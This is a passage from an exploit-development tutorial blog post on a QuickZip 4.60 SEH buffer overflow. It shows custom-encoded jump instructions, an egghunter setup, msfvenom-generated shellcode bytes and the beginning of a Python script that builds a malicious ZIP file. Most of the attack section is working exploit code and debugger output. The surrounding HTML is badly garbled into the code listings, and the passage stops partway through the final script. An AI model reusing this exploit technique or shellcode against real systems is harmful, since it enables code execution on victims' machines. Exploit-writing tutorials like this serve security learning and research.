</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;&amp;</span><span class="n">hellip</span><span class="p">;</span><span class="n">snip</span><span class="o">&amp;</span><span class="n">hellip</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Once we execute it, the following should happen:</p>

<ol>
<li>Crash is triggered</li>
<li><em>POP-POP-RET</em> instructions are called</li>
<li>Backwards jump <code>JNO $-92</code> is taken</li>
<li>Execution of custom encoder starts</li>
<li>The code will eventually reach <code>JNO</code> instruction from step 3</li>
<li><code>JNO</code> jump is taken again, but this time, the first instruction we land at is the newly written jump back by <strong>16</strong> bytes</li>
<li>Jump is taken</li>
<li>Instructions written using the custom encoder will execute</li>
</ol>


<p>Let&rsquo;s see if that&rsquo;s what really happens.</p>

<ul>
<li><p>After execution of custom encoder: *
<a href="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/22.jump%20taken%201.png"><img src="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/22.jump%20taken%201.png" alt="image" /></a></p></li>
<li><p><code>JMP</code> is taken *
<a href="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/23.jump%20taken%202.png"><img src="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/23.jump%20taken%202.png" alt="image" /></a></p></li>
<li><p>Landed before written instructions, ready to execute *
<a href="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/24.jump%20taken%203.png"><img src="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/24.jump%20taken%203.png" alt="image" /></a></p></li>
</ul>


<p>Awesome, exactly what we expected! Now we just need to figure out what value to replace <code>0xDEADBEEF</code> with and we&rsquo;re pretty much done!</p>

<p>Let&rsquo;s calculate it - current value of <code>ESP</code> is <code>0x0018FB4E</code> and our egghunter code starts at <code>0x0018FA90</code>, this means that we need to offset EAX by <code>0xBE</code> to have <code>EAX</code> pointing where we need it to.</p>

<p>Let&rsquo;s modify our exploit to instead of subtracting <code>0xDEADBEEF</code> from <code>EAX</code>, we&rsquo;ll only take away <code>0xBE</code>. The following changes should be made to the PoC:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;pre>&lt;code>                                # Zero-out EAX
</span><span class='line'>&lt;/code>&lt;/pre>
</span><span class='line'>
</span><span class='line'>&lt;p>payload += &ldquo;\x25\x01\x01\x01\x01&rdquo;   # and eax,0x01010101
</span><span class='line'>payload += &ldquo;\x25\x10\x10\x10\x10&rdquo;   # and eax,0x10101010
</span><span class='line'>                                       # write 0xff000000 into EAX
</span><span class='line'>payload += &ldquo;\x05\x01\x01\x01\x77&rdquo;   # add eax, 0x77010101
</span><span class='line'>payload += &ldquo;\x05\x01\x01\x01\x77&rdquo;   # add eax, 0x77010101
</span><span class='line'>payload += &ldquo;\x05\x10\x10\x10\x22&rdquo;   # add eax, 0x22101010
</span><span class='line'>payload += &ldquo;\x2d\x12\x12\x12\x11&rdquo;   # sub eax, 0x11121212
</span><span class='line'>payload += &ldquo;\x50&rdquo;                   # push eax;
</span><span class='line'>                                    # Zero-out EAX
</span><span class='line'>payload += &ldquo;\x25\x01\x01\x01\x01&rdquo;   # and eax,0x01010101
</span><span class='line'>payload += &ldquo;\x25\x10\x10\x10\x10&rdquo;   # and eax,0x10101010
</span><span class='line'>                                       # write 0xbe2d5854 into EAX
</span><span class='line'>payload += &ldquo;\x05\x43\x47\x1c\x67&rdquo;   # add eax, 0x671c4743
</span><span class='line'>payload += &ldquo;\x05\x11\x11\x11\x57&rdquo;   # add eax, 0x57111111
</span><span class='line'>payload += &ldquo;\x50&rdquo;                   # push eax;</span></code></pre></td></tr></table></div></figure></p>

<p>Let&rsquo;s run it and see where it gets us.</p>

<p><a href="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/28.beginning%20of%20the%20egghunter.png"><img src="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/28.beginning%20of%20the%20egghunter.png" alt="image" /></a></p>

<p>AWESOME! We landed in our egghunter. Now it should be as easy as inserting shellcode of our choice and letting egghunter find it.</p>

<p>Let&rsquo;s run <code>!mona findmsp</code> just in case to see if our payload is still there in memory&hellip;</p>

<p><a href="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/29.no%20payload.png"><img src="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/29.no%20payload.png" alt="image" /></a></p>

<p>What?! It disappeared! Where did it go? What happened? All that work for nothing????</p>

<p><strong><em> fast-forward a couple of hours </em></strong></p>

<p>Ok, I know what happens. The instruction we added at the very beginning of our custom encoding routine breaks the payload and makes our shellcode disappear. Instruction at fault is <code>POP ESP</code> (<code>\x5c</code>) - the same byte from before that made our filename to be interpreted as a directory!</p>

<p>I spent a lot of time thinking, debugging and trying to come up with an alternative that doesn&rsquo;t break the payload, but with no luck. We simply don&rsquo;t have anything we could use in this case that uses valid character set.</p>

<p>However, there is a solution! Maybe not the prettiest, but there is. Have a look at the following line in our exploit:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">exploit</span> <span class="o">=</span> <span class="n">header_1</span> <span class="o">+</span> <span class="n">payload</span> <span class="o">+</span> <span class="n">header_2</span> <span class="o">+</span> <span class="n">payload</span> <span class="o">+</span> <span class="n">header_3</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>What if we add payload once again after the header_3? It&rsquo;ll basically append some garbage at the end of the ZIP file, but it should still work. Let&rsquo;s give it a shot!</p>

<p>Modify the line as follows and open it us with QuickZip.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">exploit</span> <span class="o">=</span> <span class="n">header_1</span> <span class="o">+</span> <span class="n">payload</span> <span class="o">+</span> <span class="n">header_2</span> <span class="o">+</span> <span class="n">payload</span> <span class="o">+</span> <span class="n">header_3</span> <span class="o">+</span> <span class="n">payload</span>
</span></code></pre></td></tr></table></div></figure></p>

<p><a href="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/30.quickzip%20warning.png"><img src="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/30.quickzip%20warning.png" alt="image" /></a></p>

<p>There&rsquo;s a warning displayed that there&rsquo;s some garbage at the end of the file, but that&rsquo;s OK, it appears that we can still successfully open the file.</p>

<p>Let&rsquo;s trigger the crash and see once again if, this time, we can find the pattern in memory.</p>

<p><a href="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/31.%20shellcode%20found%20again.png"><img src="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/31.%20shellcode%20found%20again.png" alt="image" /></a></p>

<p>Hurray!!! It&rsquo;s there!!! Now it should be all nice and easy.</p>

<h2>Shellcode</h2>

<p>Now we just need to follow the usual process of setting up the payload for shellcode - we need to figure out bad characters, insert an &ldquo;egg&rdquo; (<code>w00tw00t</code>) before the shellcode and align the stack.</p>

<p>I won&rsquo;t go into the details of finding bad characters as I already covered it in details <a href="http://blog.knapsy.com/blog/2015/11/25/easy-file-sharing-web-server-v7-dot-2-remote-seh-buffer-overflow-dep-bypass-with-rop/">here</a>. Luckily for us, the only bad characters for this part of payload are <code>\x00</code>, <code>\x0a</code> and <code>\x0d</code>.</p>

<p>We also need to insert <code>w00tw00t</code> characters at the very beginning of our shellcode to ensure that the egghunter can locate it and redirect execution to first instructions after the &ldquo;egg&rdquo;.</p>

<p>Lastly, we&rsquo;ll need to align the stack to make sure <code>ESP</code> points to an address which is a multiple of 16 bytes. The reason for this is that there are some &ldquo;<a href="https://en.wikipedia.org/wiki/SIMD">SIMD</a>&rdquo; (Single Instruction, Multiple Data) instructions which can perform parallel operations on multiple words in memory, but require those multiple words to be a block starting at an address which is a multiple of 16 bytes.</p>

<p>If we didn&rsquo;t align the stack properly, the shellcode simply wouldn&rsquo;t work. We can easily align the stack with a single instruction
<code>AND esp,0xFFFFFFF0</code>, which we&rsquo;ll add right behind the <code>w00tw00t</code> egg and before the actual shellcode.</p>

<p>For PoC, we&rsquo;ll use <code>msfvenom</code> to generate a simple, <code>calc</code> popping shellcode. To sum it all up, the shellcode code will look as follows:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">shellcode</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">w00tw00t</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>                     <span class="c"># egg</span>
</span><span class='line'><span class="n">shellcode</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x81</span>\<span class="n">xe4</span>\<span class="n">xf0</span>\<span class="n">xff</span>\<span class="n">xff</span>\<span class="n">xff</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>    <span class="c"># align the stack: AND esp,0xFFFFFFF0&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">msfvenom</span> <span class="o">-</span><span class="n">p</span> <span class="n">windows</span><span class="o">/</span><span class="k">exec</span> <span class="n">CMD</span><span class="o">=</span><span class="n">calc</span><span class="o">.</span><span class="n">exe</span> <span class="o">-</span><span class="n">b</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span>\<span class="n">x00</span>\<span class="n">x0a</span>\<span class="n">x0d</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">x86</span><span class="o">/</span><span class="n">shikata_ga_nai</span> <span class="n">succeeded</span> <span class="k">with</span> <span class="n">size</span> <span class="mi">227</span> <span class="p">(</span><span class="n">iteration</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">shellcode</span> <span class="o">+=</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">xbf</span>\<span class="n">xdc</span>\<span class="n">xae</span>\<span class="n">x26</span>\<span class="n">x3d</span>\<span class="n">xda</span>\<span class="n">xdd</span>\<span class="n">xd9</span>\<span class="n">x74</span>\<span class="n">x24</span>\<span class="n">xf4</span>\<span class="n">x5b</span>\<span class="n">x31</span>\<span class="n">xc9</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">xb1</span>\<span class="n">x33</span>\<span class="n">x31</span>\<span class="n">x7b</span>\<span class="n">x12</span>\<span class="n">x03</span>\<span class="n">x7b</span>\<span class="n">x12</span>\<span class="n">x83</span>\<span class="n">x37</span>\<span class="n">x52</span>\<span class="n">xc4</span>\<span class="n">xc8</span>\<span class="n">x3b</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x43</span>\<span class="n">x80</span>\<span class="n">x33</span>\<span class="n">xc3</span>\<span class="n">x94</span>\<span class="n">xf3</span>\<span class="n">xba</span>\<span class="n">x26</span>\<span class="n">xa5</span>\<span class="n">x21</span>\<span class="n">xd8</span>\<span class="n">x23</span>\<span class="n">x94</span>\<span class="n">xf5</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">xaa</span>\<span class="n">x61</span>\<span class="n">x15</span>\<span class="n">x7d</span>\<span class="n">xfe</span>\<span class="n">x91</span>\<span class="n">xae</span>\<span class="n">xf3</span>\<span class="n">xd7</span>\<span class="n">x96</span>\<span class="n">x07</span>\<span class="n">xb9</span>\<span class="n">x01</span>\<span class="n">x99</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x98</span>\<span class="n">x0f</span>\<span class="n">x8e</span>\<span class="n">x75</span>\<span class="n">x5a</span>\<span class="n">x11</span>\<span class="n">x72</span>\<span class="n">x87</span>\<span class="n">x8f</span>\<span class="n">xf1</span>\<span class="n">x4b</span>\<span class="n">x48</span>\<span class="n">xc2</span>\<span class="n">xf0</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x8c</span>\<span class="n">xb4</span>\<span class="n">x2d</span>\<span class="n">xa0</span>\<span class="n">x45</span>\<span class="n">xb3</span>\<span class="n">x9c</span>\<span class="n">x55</span>\<span class="n">xe1</span>\<span class="n">x81</span>\<span class="n">x1c</span>\<span class="n">x57</span>\<span class="n">x25</span>\<span class="n">x8e</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x1d</span>\<span class="n">x2f</span>\<span class="n">x40</span>\<span class="n">x50</span>\<span class="n">xe9</span>\<span class="n">x85</span>\<span class="n">x4b</span>\<span class="n">x80</span>\<span class="n">x42</span>\<span class="n">x91</span>\<span class="n">x04</span>\<span class="n">x38</span>\<span class="n">xe8</span>\<span class="n">xfd</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">xb4</span>\<span class="n">x39</span>\<span class="n">x3d</span>\<span class="n">x1e</span>\<span class="n">x88</span>\<span class="n">x70</span>\<span class="n">x4a</span>\<span class="n">xd5</span>\<span class="n">x7a</span>\<span class="n">x83</span>\<span class="n">x9a</span>\<span class="n">x27</span>\<span class="n">x82</span>\<span class="n">xb2</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">xe2</span>\<span class="n">xe4</span>\<span class="n">xbd</span>\<span class="n">x7b</span>\<span class="n">xef</span>\<span class="n">xf5</span>\<span class="n">xfa</span>\<span class="n">xbb</span>\<span class="n">x10</span>\<span class="n">x80</span>\<span class="n">xf0</span>\<span class="n">xb8</span>\<span class="n">xad</span>\<span class="n">x93</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">xc2</span>\<span class="n">xc3</span>\<span class="n">x69</span>\<span class="n">x11</span>\<span class="n">xd7</span>\<span class="n">x63</span>\<span class="n">xf9</span>\<span class="n">x81</span>\<span class="n">x33</span>\<span class="n">x92</span>\<span class="n">x2e</span>\<span class="n">x57</span>\<span class="n">xb7</span>\<span class="n">x98</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x9b</span>\<span class="n">x13</span>\<span class="n">x9f</span>\<span class="n">xbc</span>\<span class="n">x1a</span>\<span class="n">xf7</span>\<span class="n">xab</span>\<span class="n">xb8</span>\<span class="n">x97</span>\<span class="n">xf6</span>\<span class="n">x7b</span>\<span class="n">x49</span>\<span class="n">xe3</span>\<span class="n">xdc</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x5f</span>\<span class="n">x12</span>\<span class="n">xb7</span>\<span class="n">x7d</span>\<span class="n">xf9</span>\<span class="n">xfe</span>\<span class="n">x16</span>\<span class="n">x81</span>\<span class="n">x19</span>\<span class="n">xa6</span>\<span class="n">xc7</span>\<span class="n">x27</span>\<span class="n">x51</span>\<span class="n">x44</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x13</span>\<span class="n">x51</span>\<span class="n">x38</span>\<span class="n">x02</span>\<span class="n">xe2</span>\<span class="n">xd3</span>\<span class="n">x46</span>\<span class="n">x6b</span>\<span class="n">xe4</span>\<span class="n">xeb</span>\<span class="n">x48</span>\<span class="n">xdb</span>\<span class="n">x8d</span>\<span class="n">xda</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">xc3</span>\<span class="n">xb4</span>\<span class="n">xca</span>\<span class="n">xe2</span>\<span class="n">x01</span>\<span class="n">xf1</span>\<span class="n">x25</span>\<span class="n">xa9</span>\<span class="n">x08</span>\<span class="n">x53</span>\<span class="n">xae</span>\<span class="n">x74</span>\<span class="n">xd9</span>\<span class="n">xe6</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">xb3</span>\<span class="n">x86</span>\<span class="n">x37</span>\<span class="n">x24</span>\<span class="n">xca</span>\<span class="n">x04</span>\<span class="n">xb2</span>\<span class="n">xd4</span>\<span class="n">x29</span>\<span class="n">x14</span>\<span class="n">xb7</span>\<span class="n">xd1</span>\<span class="n">x76</span>\<span class="n">x92</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x2b</span>\<span class="n">xab</span>\<span class="n">xe7</span>\<span class="n">x77</span>\<span class="n">x4c</span>\<span class="n">x18</span>\<span class="n">x07</span>\<span class="n">x52</span>\<span class="n">x2f</span>\<span class="n">xff</span>\<span class="n">x9b</span>\<span class="n">x3e</span>\<span class="n">x9e</span>\<span class="n">x9a</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x1b</span>\<span class="n">xa4</span>\<span class="n">xde</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>And the final PoC code covering everything discussed so far should look like this:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="err">!</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">python</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">header_1</span> <span class="o">=</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x50</span>\<span class="n">x4B</span>\<span class="n">x03</span>\<span class="n">x04</span>\<span class="n">x14</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">xB7</span>\<span class="n">xAC</span>\<span class="n">xCE</span>\<span class="n">x34</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">xe4</span>\<span class="n">x0f</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">header_2</span> <span class="o">=</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x50</span>\<span class="n">x4B</span>\<span class="n">x01</span>\<span class="n">x02</span>\<span class="n">x14</span>\<span class="n">x00</span>\<span class="n">x14</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">xB7</span>\<span class="n">xAC</span>\<span class="n">xCE</span>\<span class="n">x34</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">xe4</span>\<span class="n">x0f</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x01</span>\<span class="n">x00</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x24</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">header_3</span> <span class="o">=</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x50</span>\<span class="n">x4B</span>\<span class="n">x05</span>\<span class="n">x06</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x01</span>\<span class="n">x00</span>\<span class="n">x01</span>\<span class="n">x00</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x12</span>\<span class="n">x10</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x02</span>\<span class="n">x10</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">print</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;[</span><span class="o">+</span><span class="p">]</span> <span class="n">Building</span> <span class="n">PoC</span><span class="o">..&amp;</span><span class="n">rdquo</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">max_size</span> <span class="o">=</span> <span class="mi">4064</span>
</span><span class='line'><span class="n">nseh_offset</span> <span class="o">=</span> <span class="mi">292</span>
</span><span class='line'><span class="n">jump_offset</span> <span class="o">=</span> <span class="mi">92</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
